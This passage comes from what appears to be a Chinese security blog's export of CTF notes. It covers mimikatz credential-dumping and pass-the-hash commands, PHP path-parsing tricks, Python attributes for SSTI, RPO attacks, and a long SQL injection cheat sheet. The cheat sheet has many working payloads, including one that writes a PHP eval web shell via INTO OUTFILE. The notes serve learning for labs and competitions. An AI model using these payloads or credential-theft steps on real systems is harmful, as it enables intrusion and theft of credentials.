<h3 id="sekurlsa-dpapisystem"><a href="#sekurlsa-dpapisystem" class="headerlink" title="sekurlsa::dpapisystem"></a>sekurlsa::dpapisystem</h3><p>输出DPAPI_SYSTEM密文（密钥？）原文为secret</p>
<h3 id="sekurlsa-ekeys"><a href="#sekurlsa-ekeys" class="headerlink" title="sekurlsa::ekeys"></a>sekurlsa::ekeys</h3><p>列出kerberos加密密钥</p>
<h3 id="sekurlsa-kerberos"><a href="#sekurlsa-kerberos" class="headerlink" title="sekurlsa::kerberos"></a>sekurlsa::kerberos</h3><p>列出所有登录用户的kerberos凭证（包括服务和电脑账户）</p>
<h3 id="sekurlsa-krbtgt"><a href="#sekurlsa-krbtgt" class="headerlink" title="sekurlsa::krbtgt"></a>sekurlsa::krbtgt</h3><p>获取krbtgt的全部凭证（当然要在DC上运行啦）</p>
<h3 id="sekurlsa-logonpasswords"><a href="#sekurlsa-logonpasswords" class="headerlink" title="sekurlsa::logonpasswords"></a>sekurlsa::logonpasswords</h3><p>我觉得是mimikatz使用最多的命令了（可能比privilege::debug少）<br>列出所有可用的凭证，windows8.1和windows server2012R2之前的系统会列出明文密码（高版本或打补丁后不会）</p>
<h3 id="sekurlsa-minidump"><a href="#sekurlsa-minidump" class="headerlink" title="sekurlsa::minidump"></a>sekurlsa::minidump</h3><p>上下文切换到lsass转储文件，就是读以前倒出来的lsass内存文件<br>后接一个参数为dmp文件路径</p>
<p>可以通过procdump，Powershell和任务管理器等方式搞定procdump是微软的软件不会被杀，可以用这个dump出来然后发送到本地再用mimikatz读，或者直接任务管理器也可以Create Dump File</p>
<h3 id="sekurlsa-process"><a href="#sekurlsa-process" class="headerlink" title="sekurlsa::process"></a>sekurlsa::process</h3><p>和上个命令对应，上下文切换回lsass进程</p>
<h3 id="sekurlsa-msv"><a href="#sekurlsa-msv" class="headerlink" title="sekurlsa::msv"></a>sekurlsa::msv</h3><p>列出LM和NTLM凭证</p>
<h3 id="sekurlsa-pth"><a href="#sekurlsa-pth" class="headerlink" title="sekurlsa::pth"></a>sekurlsa::pth</h3><p>pass the hash，进行哈希传递<br>使用一个用户的NTLM哈希上下文启动进程<br>接收如下参数</p>
<blockquote>
<p>&#x2F;user － 你想进行假冒的用户名，需要明白的是，Administrator 不是唯一一个已知的帐户。<br>&#x2F;domain – 域名<br>&#x2F;rc4 or &#x2F;ntlm （可选的） – 指定用户的 RC4 密钥 或 NTLM 哈希。<br>&#x2F;run （可选的） – 需要运行的命令行 – 默认为：cmd ，得到一个 cmd shell。</p>
</blockquote>
<p><strong>该命令不能与minidumps一起使用</strong><br>本地测试失败。。。呜呜</p>
<h3 id="sekurlsa-tickets"><a href="#sekurlsa-tickets" class="headerlink" title="sekurlsa::tickets"></a>sekurlsa::tickets</h3><p>列出最近所有已经过身份验证的用户的可用的 Kerberos 票证，包括使用用户帐户的上下文运行的服务和本地计算机在 AD 中的计算机帐户。</p>
<h2 id="token"><a href="#token" class="headerlink" title="token"></a>token</h2><p>与windows身份验证令牌进行交互，抓取，伪造假冒的已存在令牌</p>
<h3 id="token-elevate"><a href="#token-elevate" class="headerlink" title="token::elevate"></a>token::elevate</h3><p><strong>需管理员权限</strong>，提升至system权限<br>可加参数&#x2F;domainadmin，找到一个域管理员凭证并使用其令牌</p>
<h3 id="token-whoami"><a href="#token-whoami" class="headerlink" title="token::whoami"></a>token::whoami</h3><p>显示当前身份</p>
<h3 id="token-list"><a href="#token-list" class="headerlink" title="token::list"></a>token::list</h3><p>列出所有令牌</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://wooyun.js.org/drops/Mimikatz%20%E9%9D%9E%E5%AE%98%E6%96%B9%E6%8C%87%E5%8D%97%E5%92%8C%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83_Part3.html">Mimikatz非官方指南和命令参考</a><br><a href="https://adsecurity.org/?page_id=1821">英文原版</a>（上述翻译版存在<br><a href="https://blog.walterlv.com/post/windows-user-account-control.html">Windows中的UAC账户控制</a><br><a href="https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Skeleton%20Key.html">mimikatz-skeleton key</a><br><a href="https://docs.microsoft.com/zh-cn/windows/security/identity-protection/access-control/active-directory-accounts">微软AD官方文档</a></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>mimikatz</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP文件操作漏洞</title>
    <url>/PHP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<h1 id="PHP文件操作漏洞"><a href="#PHP文件操作漏洞" class="headerlink" title="PHP文件操作漏洞"></a>PHP文件操作漏洞</h1><p>今天师傅们在群里聊到一个问题，有关于PHP文件操作对目录和文件判定相关的一个点，看了师傅们找到的一篇文章，感觉很有意思</p>
<p>PHP底层实现存在的一些问题，导致PHP写入、读取时对畸形文件名存在一些错误处理，导致漏洞产生</p>
<h2 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h2><p>file_put_contents和fopen等函数，使用了PHP的底层封装流，面对&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#x2F;. 这种畸形路径时会将其解析为正常的&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php，导致对后缀名的绕过，而对于rename，unlink等函数，则会直接将此路径在Linux下进行系统调用，得到not a directory的错误，无法删除<br>此问题在Linux与Windows系统下均存在</p>
<h2 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h2><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;null&#x2F;..&#x2F;index.php<br>在其中设置一个不存在的null目录，再使用..跳出，在Linux识别到未知目录时会引发找不到目录的错误，而Windows在不存在目录后接..则会忽略该目录，但PHP在处理时会因为Linux下的这个问题导致对已存在的index.php的重写</p>
<h2 id="例三"><a href="#例三" class="headerlink" title="例三"></a>例三</h2><p>PHP超全局变量$_FILES可以获取上传的全部文件，$_FILES[‘file’][‘name’]会获取上传文件名中最后一个&#x2F;后的内容，而上传的文件会存在于一个tmp目录下，该名称可以由$_FILES[‘file’][‘tmp_name’]获取，并在move_uploaded_file时使用该名称进行移动，tmpfile的名称为php+六位随机字符串，在脚本执行结束时删除。<br>如果边提交文件边访问phpinfo界面，其会显示$_FILES的内容，也就是可以获取到tmp_name，虽然此时脚本已经允许完毕文件被删除，但可以尝试条件竞争进行getshell<br>贴一个链接<br><a href="https://blog.csdn.net/adminuil/article/details/104398823">https://blog.csdn.net/adminuil/article/details/104398823</a></p>
<p>并且这里的$_FILE[‘file’]这里的file是上传时提交的一项参数，如果检测只对$_FILE[‘file’]进行检测，而上传使用了其他的函数将所有收到的文件进行保存的话，就可以随便上传一个文件，把file改成随便什么东西就可以进行绕过了</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://d1iv3.me/2018/04/15/%E4%BB%8EPHP%E6%BA%90%E7%A0%81%E7%9C%8BPHP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%BC%BA%E9%99%B7%E4%B8%8E%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/">http://d1iv3.me/2018/04/15/%E4%BB%8EPHP%E6%BA%90%E7%A0%81%E7%9C%8BPHP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%BC%BA%E9%99%B7%E4%B8%8E%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Python特殊属性</title>
    <url>/Python%E7%89%B9%E6%AE%8A%E5%B1%9E%E6%80%A7.html</url>
    <content><![CDATA[<h1 id="Python特殊属性"><a href="#Python特殊属性" class="headerlink" title="Python特殊属性"></a>Python特殊属性</h1><p>Python垃圾来学习一下python的各种奇怪方法，以后打SSTI或者pickle的时候不至于这么惨</p>
<h2 id="dict"><a href="#dict" class="headerlink" title="__dict__"></a>__dict__</h2><p>对类对象使用时，以字典形式返回类对象的全部属性，使用__dict__.update可以更新对象属性，任意更新，可以增加对象原本不存在的属性<br>对函数使用意义不大</p>
<h2 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a>__globals__</h2><p>对函数使用时返回函数所在模块内的所有全局变量，隐约记得flask和Django好像可以用这个看secret key之类的奇怪属性，好像不能对类对象使用</p>
<h2 id="sys-modules"><a href="#sys-modules" class="headerlink" title="sys.modules"></a>sys.modules</h2><p>sys记录的是python运行时的各类信息，sys.modules即python已经加载的模块，除了当前文件中显式import的内容，由于import的模块在实现时也会导入其他模块，所以其存在的模块远大于显式导入的模块<br>pickle反序列化时可用，用来摸一些奇怪的模块出来</p>
<h2 id="file"><a href="#file" class="headerlink" title="__file__"></a>__file__</h2><p>对模块使用，返回模块所在的文件路径</p>
<h2 id="builtins模块"><a href="#builtins模块" class="headerlink" title="builtins模块"></a>builtins模块</h2><p>是python的内置模块，不需要显式导入，在python启动时就进行自动加载，存在一些比较有意思的属性<br>比如超级万金油getattr，让你从任意未加载模块中获取内容<br>其中的内置数据类型dict可以获得其get方法，就能从globals或者modules之类的地方get一个东西出来<br>builtins.globals为当前环境上下文，可以从这里面又获取一堆东西<br>builtins里面直接有eval，不过python的eval和和PHP之类的语言的eval存在一定出入，总感觉不能直接命令执行？</p>
<p>主要是也不知道还有啥，遇到的时候又都记不住了，先记这么一点点</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://segmentfault.com/a/1190000005685090">https://segmentfault.com/a/1190000005685090</a><br><a href="https://www.cnblogs.com/jessonluo/p/4752349.html">https://www.cnblogs.com/jessonluo/p/4752349.html</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>RPO简单入门</title>
    <url>/RPO.html</url>
    <content><![CDATA[<h1 id="RPO简单入门"><a href="#RPO简单入门" class="headerlink" title="RPO简单入门"></a>RPO简单入门</h1><p>今天和AA聊天感觉最近刷题刷的有点无意义，应该学点东西而不是变成赛棍，故开始学习一些乱七八糟的新知识，比如这个RPO攻击，还蛮有意思的</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>RPO即relative path overwrite，相对路径覆盖，通过浏览器和服务器解析差异进行攻击</p>
<p>当我们用src标签引入js或者是css资源的时候，如果是以相对路径引入，如<code>src=static/1.js</code>，而这个资源是由浏览器去请求的，浏览器并不知道自己服务器端的文件结构，所以只能凭借url去解析，把最后一个&#x2F;作为目录发起一个访问，如果我们的url是<code>www.z3ratu1.com/index/RPO/aaa</code>，那么浏览器访问资源的路径就是<code>www.z3ratu1.com/index/RPO/static/1.js</code></p>
<p>攻击方式目前看到两种，一种是跨目录加载资源，一种是将当前页面内容作为js或css解析</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="跨目录资源加载"><a href="#跨目录资源加载" class="headerlink" title="跨目录资源加载"></a>跨目录资源加载</h3><p>利用的是Nginx对url的解析和浏览器的差异完成的<br>比如说我们现在在网站下放一个index.php里面写一句<code>&lt;script src=static/1.js&gt;&lt;/script&gt;</code><br>&#x2F;的URL编码为%2f，对于Nginx服务器而言，访问<code>www.z3ratu1.com/RPO/../index.php</code>和访问<code>www.z3ratu1.com/RPO/..%2findex.php</code>是一致的，都是跳了一级目录最后又访问回了<code>www.z3ratu1.com/index.php</code>，Nginx能解析url编码再访问正确的资源<br>Apache就不能解析这个东西，它会把%2f就正常的当做一个编码，Apache会简单认为你在访问RPO目录下一个名字叫<code>../index.php</code>的文件<br>那么浏览器看到<code>www.z3ratu1.com/RPO/..%2findex.php</code>这么个东西的时候，必定会觉得当前目录是<code>www.z3ratu1.com/RPO/</code>，比如说我们要加载<code>static/1.js</code>那么访问的就应该是<code>www.z3ratu1.com/RPO/static/1.js</code>，而不是原先index.php应该直接加载根目录下的<code>www.z3ratu1.com/static/1.js</code><br>若RPO目录可控，就能包含任意的js代码</p>
<h3 id="将当前页面内容为当做js或css解析"><a href="#将当前页面内容为当做js或css解析" class="headerlink" title="将当前页面内容为当做js或css解析"></a>将当前页面内容为当做js或css解析</h3><p>PHP开发或者是python开发的时候会有那种pathinfo的解析形式，就比如<code>www.z3ratu1.com/index.php/mode/login/id/1</code>之类的这种东西，python也可以写路由解析，事实上就是传参，解析完了就是mode&#x3D;login&amp;id&#x3D;1这种情况<br>但是浏览器可不知道你后端是怎么想的，那么就会造成一些玄妙的漏洞出现<br>而这种模式传参可能会允许你传一些无用的参数，比如你访问一个<code>www.z3ratu1.com/index.php/mode/login/id/1/z33</code>，服务器那边可能就会觉得你只不过是提交了一个无用参数，而返回的界面仍然是访问<code>www.z3ratu1.com/index.php/mode/login/id/1/</code>的结果。<br>但浏览器不会这么认为，我们假定index.php里面有这么两句：</p>
<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>RPO.js</span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">herf</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>RPO.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>link</span><span class="token punctuation">></span></span>
</code></pre>
<p>那么我们的浏览器就会对<code>www.z3ratu1.com/index.php/mode/login/id/1/RPO.js</code>和<code>www.z3ratu1.com/index.php/mode/login/id/1/RPO.css</code>发起请求<br>而正如我们上面所说的，pathinfo的解析形式其实是index.php是文件名，而后面跟的这一大堆其实只是个参数，RPO.js和PRO.css也被当作了一个参数，那么<code>www.z3ratu1.com/index.php/mode/login/id/1/</code>的内容就被浏览器当做是js文件的内容和css文件的内容解析了进来，实现对当前页面内容的解析</p>
<p>这里有一个有意思的点，js如果整个代码里面有一个地方有错误就用不了了，但css不会，css会自动忽略不符合语法的点，只解析能解析的语句</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/fly_hps/article/details/86621211">RPO简单入门</a><br><a href="http://blog.nsfocus.net/rpo-attack/">RPO超详细解析</a><br><a href="https://lorexxar.cn/2018/01/02/34c3-writeup/#CSS-RPO">RPOCTF题</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>RPO</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL injection</title>
    <url>/SQL%20injection.html</url>
    <content><![CDATA[<h1 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h1><p> 对SQL注入的一些常见payload和不同类型注入的总结</p>
<h2 id="基础无过滤注入"><a href="#基础无过滤注入" class="headerlink" title="基础无过滤注入"></a>基础无过滤注入</h2><h3 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h3><p> 这种注入需要有回显位，使用联合注入<code>union select</code>，主要注入参数需为一个错误指，才能显示联合查询后面的内容，使用<code>order by</code>语句或者直接尝试来探取行数进行回显。<br> 使用<code>group_concat</code>聚合函数将查询结果一次性输出，提高效率。<br> 以sqli-lab的less1为例，payload为：<br> 数据库名：<br><code>?id=-1&#39; union select 1,2,database() --+</code><br>获取全部数据库名<br><code>id=-1 union select schema_name from information_schema.schemata --+</code><br> 表名：<br><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code><br> 列名：<br> <code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code><br> 数据：<br> <code>id=-1 union select 1,2,group_concat(username,0x3a,password) from users --+</code><br> 此处<code>group_concat</code>函数中间的参数为一个字符，将username和password分割开来，便于观察</p>
<h4 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h4><p> 题目利用了union联合注入，过滤了括号，绝杀，base32+base64给出提示<code>select * from user where username = &#39;$name&#39;</code><br> 过滤了括号使得绝大多数注入方式无效，测试得知有一个名为admin的用户存在，union select在该查询内容查询不到时会把输入内容作为查询结果返回，因此构造<code>name=a&#39; union select 1,&#39;admin&#39;,&#39;md5(passwd)&#39;&amp;&amp;pw=passwd</code>即可，题目提示了password的校验是通过对比MD5，所以我们以上述方式构造，返回的查询结果即为我们构造的结果，所以只要随便提交一个passwd和与其对应的md5就能成功登陆了</p>
<h3 id="基于错误的注入"><a href="#基于错误的注入" class="headerlink" title="基于错误的注入"></a>基于错误的注入</h3><p> 这种类型就是会把SQL语句的错误给返回出来，那么可以通过报错信息来获得敏感数据，常用函数为<code>extractvalue</code>和<code>updatexml</code>，用concat函数将待查询语句聚合为该函数的第二个参数，由于我们查询的数据不符合Xpath语法，产生报错获取信息<br> 此时需要查询的id为真，需要预先知道一个用户名（admin）或id(1)<br> 使用格式为：<br> <code>?id=1&#39;and extractvalue(1,concat(0x7e,(查询语句) )) --+</code><br> 报错显示可能存在长度限制，使用not in语句查询剩余值<br> 同样sqli-lab中less1为例<br>多年不写SQL注入已经忘了这个函数怎么用的了。。。。concat一个0x7e，也就是<code>~</code>，能保证解析出问题然后把保存回显出来<br> payload：<code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and column_name not in (&#39;user_id&#39;,&#39;first_name&#39;,&#39;last_name&#39;)))) --+</code><br>updatexml和extractvalue差不多，但是updatexml比extractvalue多一个参数，随便写个啥就行<br><code>updatexml(1,concat(0x7e,(查询语句),2))</code></p>
<h4 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h4><p>一道二次注入加报错注入的题，题目过滤了空格和&lt;&gt;不等号，还有一些无关紧要的东西，updatexml和extractvalue可用，新奇点在于过滤了空格和不等号后，not in和不等号无法使用，而报错注入输出的错误信息长度是有限的，所以会出现获取不到有效信息的问题，这里就有两个新知识点</p>
<p>SQL查询也支持正则匹配，使用方式为 <code>where column/table_name regexp (pattern)</code>，利用正则表达式就可以获取我们想要的内容，但是如果单条消息过长导致的输出不全，正则匹配也没有用，这时可以逆序输出，使用reverse函数即可<br>把今天用的几个payload补上来，括号数量不要输错了</p>
<p><code>1&quot;&amp;&amp;extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;&amp;&amp;(column_name)regexp(&#39;^r&#39;))))#</code><br><code>1&quot;&amp;&amp;extractvalue(1,concat(0x7e,reverse((select(group_concat(username))from(users)where(username)regexp(&#39;^f&#39;)))))#</code></p>
<h4 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h4><p>标准公式<code>union select 1 from (select count(),concat(floor(rand(0)*2),(注入语句))a from information_schema.tables group by a)b --+</code><br>这个方法具有一定的随机性，爆出来的数据取决于rand()函数，并且是以报错的形式显示出来。不怎么实用，原理如下<br><a href="https://www.cnblogs.com/laoxiajiadeyun/p/10278512.html">https://www.cnblogs.com/laoxiajiadeyun/p/10278512.html</a></p>
<h3 id="盲注入"><a href="#盲注入" class="headerlink" title="盲注入"></a>盲注入</h3><p> 基于时间和bool类型的盲注入界面没有错误回显，也没有查询显示位，bool注入一般只有一个标志位确认你目前的语句是否正确<br> 时间类型的注入可能页面无任何回显，使用<code>sleep()</code>函数延迟判断结果是否正确<br> 此类注入手工注入十分麻烦，需要用一定的python基础写脚本跑比较好<br> 常用语句有<code>if length left limit</code><br> left(arg,n)取arg左边n位，用if判断<br> limit x,1 从第x位（从0开始）取1个</p>
<h4 id="基于bool的盲注入"><a href="#基于bool的盲注入" class="headerlink" title="基于bool的盲注入"></a>基于bool的盲注入</h4><p> 样例payload：<br> <code>?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; --+</code><br> 手工注入的时候可以不用等于号，用&gt;&lt;号加快注入速度<br> 这方面还有许多奇怪函数，待填坑</p>
<h4 id="基于时间的盲注入"><a href="#基于时间的盲注入" class="headerlink" title="基于时间的盲注入"></a>基于时间的盲注入</h4><p> 样例payload：<br> <code>?id=1&#39; and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; , sleep(3), 1) --+</code><br> 多一层if语句，判断正确则调用sleep函数，页面存在明显延迟<br> 还有一个替代sleep的函数，BENCHMARK(count,expr)，执行expr count次，可以通过执行简单的语句几千次来实现延时<br> 简单讲一下if语句，if需要三个表达式，执行效果类似于C++中的 <code>a=b?a:b</code>语句</p>
<h3 id="使用update语句的注入"><a href="#使用update语句的注入" class="headerlink" title="使用update语句的注入"></a>使用update语句的注入</h3><p> 查询语句为常为<br> <code>UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$username&#39;</code></p>
<h4 id="update后可见被更新数据的注入"><a href="#update后可见被更新数据的注入" class="headerlink" title="update后可见被更新数据的注入"></a>update后可见被更新数据的注入</h4><p> 将passwd改为<code>&#39;,username=database() #</code>即可将所有的用户名修改为database(),如果能观察到被修改的数据，即可完成注入，update语句中的select经常会遇到一些不期待的奇怪问题，如需嵌套两层select，并需要给其加上一个别名<br> 例如：<code>(select description from(select * from users where username=0x61646d696e)a)</code> </p>
<h4 id="有语法错误回显的注入"><a href="#有语法错误回显的注入" class="headerlink" title="有语法错误回显的注入"></a>有语法错误回显的注入</h4><p> 该类型注入通常会对username进行强过滤，需要从password进行突破。一般是基于报错进行注入，常用函数为<code>extractvalue</code>和<code>updatexml</code>,操作在最后一步爆数据时略有差异。<br>sqli-lab的less17为例：</p>
<ul>
<li>使用<code>extractvalue</code>函数：<code>passwd=1&#39; and extractvalue(1,concat(0x7e,(select password from users where username=&#39;admin&#39;))) --+</code></li>
</ul>
<p> 此时报错<code> You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code><br> 查一下之后解决方案为多加一层select，变为<code>passwd=1&#39; and extractvalue(1,concat(0x7e,(select password from (select password from users where username=&#39;admin&#39;))) --+</code></p>
<p> 再次报错<code>Every derived table must have its own</code>，需要给表加一个别名<br> payload为<code>1&#39; and extractvalue(1,concat(0x7e,(select password from (select password from users where username=&#39;admin&#39;)as test))) --+</code><br>  此时注入就成功了。</p>
<p>  有时还会报一个返回的数据超过一行的错误，<code>Subquery returns more than 1 row </code>只需在where子句后再加上一句limit 0,1即可解决</p>
<ul>
<li>使用<code>updatexml</code>函数<br> <code>1&#39; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) --+ </code><br> 同样遭遇上述报错，最终payload为<code>1&#39;  and  updatexml(1,concat(0x7e,(select password from (select password from users where username=&#39;admin&#39;) test),0x7e),1) --+</code></li>
</ul>
<h3 id="导出文件型注入"><a href="#导出文件型注入" class="headerlink" title="导出文件型注入"></a>导出文件型注入</h3><p> 本题来源为sqli-lab的less7<br> 原理是利用SQL注入来获取getshell</p>
<p> 这里还是先把正规做法过一遍，首先是得到文件的路径，一般来说默认路径为<code>var/www/html</code><br> 也有说不同服务器的默认路径有别，如下</p>
<blockquote>
<p>winserver的iis默认路径c:\Inetpub\wwwroot<br>linux的nginx一般是&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html， &#x2F;home&#x2F;wwwroot&#x2F;default， &#x2F;usr&#x2F;share&#x2F;nginx， &#x2F;var&#x2F;www&#x2F;htm等<br>apache 就是 …&#x2F;var&#x2F;www&#x2F;htm，…&#x2F;var&#x2F;www&#x2F;html&#x2F;htdocs<br>phpstudy 就是 …\PhpStudy20180211\PHPTutorial\WWW<br>xammp 就是 …\xampp\htdocs</p>
</blockquote>
<p> 这里是本地PHPstudy搭建的环境，所以payload路径如下：<br> <code>http://localhost/sqli-labs-master/Less-7/?id=1&#39;)) union select 1,2,&#39;&lt;?php eval($_POST[&#39;a&#39;]);?&gt;&#39; into outfile &#39;D:\PHPStudy\PHPTutorial\WWW\sqli-labs-master\1.php&#39; --+ </code><br>into outfile将写入脚本（这里需要预先知道正确的物理路径才能写入），而load_file将读取文件<br>写入PHP一句话，使用中国菜刀连上即可，需要使用union select，select语句有执行功能</p>
<p>还有一题为网鼎杯的fakebook<br>这个题的过滤不够完善，使得我们可以使用MySQL的load_file函数读取flag<br>该题报错泄露了服务器的目录，为标准的&#x2F;var&#x2F;www&#x2F;html，就可以使用load_file函数对文件进行读取，注意.php文件在读取后&lt;&gt;会被视为注释，需要查看网页源码才能看到<br>贴一个博文<br><a href="https://www.cnblogs.com/blacksunny/p/8060028.html">https://www.cnblogs.com/blacksunny/p/8060028.html</a></p>
<h4 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h4><p>这个方法需要SQL开启secure-file-priv写文件权限，否则不能写入文件。<br>可在SQL设置中将secure-file-priv参数设置为“”即可<br>如果引号中是一个文件路径的话，导入&#x2F;出的文件路径会再这个路径下。</p>
<h3 id="基于错误的头部注入"><a href="#基于错误的头部注入" class="headerlink" title="基于错误的头部注入"></a>基于错误的头部注入</h3><p>和之前的基于错误的注入区别不是很大，关键在于注入点由id,username,password转到了user-agent，cookie或者是referer等数据包请求头，可通过burp suite抓包修改。使用上述的两个函数引发错误获取信息，或者是直接注入</p>
<h4 id="使用insert语句的注入"><a href="#使用insert语句的注入" class="headerlink" title="使用insert语句的注入"></a>使用insert语句的注入</h4><p>sqlil-lab的less18将用户的UA插入了数据库，使用的是INSERT语句<code>INSERT INTO &#39;security&#39;.&#39;uagents&#39; (&#39;uagent&#39;, &#39;ip_address&#39;, &#39;username&#39;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)</code><br>这里不好使用注释符将后面内容注释掉，所以我们使用之前提到的办法用<code>and &#39;</code>来闭合引号<br>样例payload：<br><code>User-Agent:&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;</code></p>
<h4 id="基于错误的cookie注入"><a href="#基于错误的cookie注入" class="headerlink" title="基于错误的cookie注入"></a>基于错误的cookie注入</h4><p>cookie是服务器用来辨别访问者的一段小文本，所以当我们向页面发起请求时，若cookie尚未过期，服务器即可通过cookie识别我们的身份，既然如此，就存在着服务器通过cookie查询数据的操作，我们便可通过cookie进行注入</p>
<p>sqli-lab的less20为例<br>在后台代码存在当用户发起访问且未进行post数据（登录操作）时，及用户纯粹的再次访问网站时，进行了数据库查询。<br>所以这里要求的是!isset($_POST[‘submit’])，这个地方我困惑了好久</p>
<p>我们在bp抓包之后不进行post数据，直接发起访问，系统就会将我们的cookie放入数据库进行查询，此时我们使用修改过的cookie进行注入<br>这里cookie接受的参数名称为uname，题目中给出了一定的提示<br>样例payload：<br><code>Cookie: uname=admin&#39; union select 1,2,database()--+</code><br>在less21提出了一个base64加密cookie的操作，唯一的功能就是–+这个注释不能用了，应该是提交的时候进行了URL编码，+被换成空格去掉了，在进行编码解码时就丢失了，要改成#进行注释</p>
<h3 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h3><p>2020国赛决赛做到的一个题，一开始以为是limit注入，去学习了一波，结果并不是<br>p神博客文章<br><a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a><br>用了一个新的语句PROCEDURE ANALYSE，这个语句是用来做数据分析的（？但是这里拿来注入）<br>analyse接受两个参数，第一个可以用来执行命令，放一个p神的payload<br><code>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code><br>括号套的人头晕<br>还有个新东西BENCHMARK，接受两个参数，运行次数和命令语句<br>运行n次指定的指令，运行次数够大之后就可以代替sleep进行延迟<br>比如BENCHMARK(5000000,SHA1(1))</p>
<h3 id="整数溢出注入"><a href="#整数溢出注入" class="headerlink" title="整数溢出注入"></a>整数溢出注入</h3><p>也是bool注入的一种类型，通过最大数字+1导致整数溢出报错进行布尔判断，+1加的就是一个判断的结果true为1false为0<br>同详见RoarCTF2020wp</p>
<h2 id="进阶有过滤注入"><a href="#进阶有过滤注入" class="headerlink" title="进阶有过滤注入"></a>进阶有过滤注入</h2><p>无过滤在找到注入点之后基本都能被SQLmap给跑出来，一切当然不会这么简单，所以这里还有各种各样的有过滤的注入，比如过滤注释符，过滤and or等关键字，过滤逗号括号空格等等<br>且该种注入也会和上述基础注入类型结合，出现过滤了注释符的盲注入之类的，很容易让人困惑</p>
<h3 id="过滤注释符"><a href="#过滤注释符" class="headerlink" title="过滤注释符"></a>过滤注释符</h3><p>SQL注入需要用注释符注释掉后面的内容，使得我们插入的内容得以执行，当注释符被过滤时，我们可以通过再构造一个<code>and &#39;</code>来重新闭合引号，而不是使用注释符来注释引号。<br>样例payload：<br><code>?id=-1 union select group_concat(table_name) from information_schema.tables where table_schema=database() and &#39;1&#39;=&#39;1</code><br>此时经常构造<code>and &#39;1&#39;=&#39;1</code>和<code> where &#39;1&#39;=&#39;1</code>的语句，既能闭合引号，又完成了对所有数据的查询</p>
